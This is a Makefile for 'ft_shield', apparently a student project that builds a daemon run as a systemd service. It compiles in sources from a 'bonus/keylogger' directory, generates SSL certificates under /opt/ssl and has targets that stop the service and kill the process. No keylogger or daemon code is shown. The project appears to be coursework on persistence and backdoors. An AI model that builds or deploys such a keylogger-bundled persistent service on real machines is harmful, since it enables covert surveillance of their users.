NAME = ft_shield
CC = gcc
LOCK_FILE = /run/ft_shield.lock
SSL_DIR = /opt/ssl
LOCAL_KEY = ft_shield_key.pem
LOCAL_CERT = ft_shield_cert.pem
TARGET_KEY = $(SSL_DIR)/$(LOCAL_KEY)
TARGET_CERT = $(SSL_DIR)/$(LOCAL_CERT)
LOG_FILE = $(TMP_DIR)/daemon.log

#ASAN_OPTIONS=detect_leaks=1 ./ft_shield ==> detect leaks

CFLAGS = -Wall -Wextra -Werror -O0 -fno-pie -no-pie
SANITIZE_FLAGS = -fsanitize=address -g
LDFLAGS = -lssl -lcrypto -ldl

SRCS_DIR = .
BONUS_SRCS_DIR = ../../bonus/keylogger
OBJS_DIR = objs

SRCS = $(wildcard $(SRCS_DIR)/*.c) $(wildcard $(BONUS_SRCS_DIR)/*.c)
OBJS = $(patsubst $(SRCS_DIR)/%.c,$(OBJS_DIR)/%.o,$(filter %.c,$(wildcard $(SRCS_DIR)/*.c))) \
       $(patsubst $(BONUS_SRCS_DIR)/%.c,$(OBJS_DIR)/%.o,$(filter %.c,$(wildcard $(BONUS_SRCS_DIR)/*.c)))

all: $(NAME)

$(NAME): $(OBJS)
	@$(CC) $(CFLAGS) -o $@ $^ $(LDFLAGS)
	@echo "Compilation de $(NAME) terminée."

sanitize: CFLAGS += $(SANITIZE_FLAGS)

sanitize: re
	@echo "Compilation avec AddressSanitizer terminée."

$(OBJS_DIR)/%.o: $(SRCS_DIR)/%.c | $(OBJS_DIR)
	@$(CC) $(CFLAGS) -c $< -o $@
	@echo "Compilation de $< terminée."

$(OBJS_DIR)/%.o: $(BONUS_SRCS_DIR)/%.c | $(OBJS_DIR)
	@$(CC) $(CFLAGS) -c $< -o $@
	@echo "Compilation de $< (bonus) terminée."

$(OBJS_DIR):
	@mkdir -p $@

ssl:
	@echo "Génération des certificats SSL localement..."

	@echo "Création du dossier $(SSL_DIR)..."
	@sudo mkdir -p $(SSL_DIR)
	@sudo chmod 750 $(SSL_DIR)
	@sudo chown root:root $(SSL_DIR)

	@sudo openssl req -x509 -newkey rsa:2048 \
		-keyout $(TARGET_KEY) \
		-out $(TARGET_CERT) \
		-sha256 -days 365 \
		-nodes -subj "/CN=localhost"

	@echo "Ajustement des permissions..."
	@sudo chmod 640 $(TARGET_KEY)
	@sudo chmod 644 $(TARGET_CERT)

	@echo "Certificats installés dans $(SSL_DIR)"

clean:
	@rm -rf $(OBJS_DIR)
	@echo "Nettoyage des fichiers objets terminé."

fclean: clean
	@rm -f $(NAME)
	@sudo rm -f $(LOCK_FILE)
	@echo "Nettoyage complet terminé."

re: fclean all

install_openssl:
	@echo "Installation de la librairie OpenSSL..."
	@sudo apt-get update && sudo apt-get install -y libssl-dev
	@echo "OpenSSL installé avec succès."

stop:
	@echo "Arrêt du service ft_shield.service..."
	@sudo systemctl stop ft_shield.service || true
	@echo "Suppression du fichier de configuration systemd..."
	@sudo rm -f /etc/systemd/system/ft_shield.service
	@sudo systemctl daemon-reload
	@echo "Service ft_shield supprimé avec succès."
	@PID=$$(pgrep -f ft_shield); \
	if [ -n "$$PID" ]; then \
		echo "Killing SHIELD process (PID=$$PID)..."; \
		sudo kill -9 $$PID; \
	else \
		echo "Aucun processus SHIELD trouvé."; \
	fi

.PHONY: all clean fclean re sanitize install_openssl ssl stop
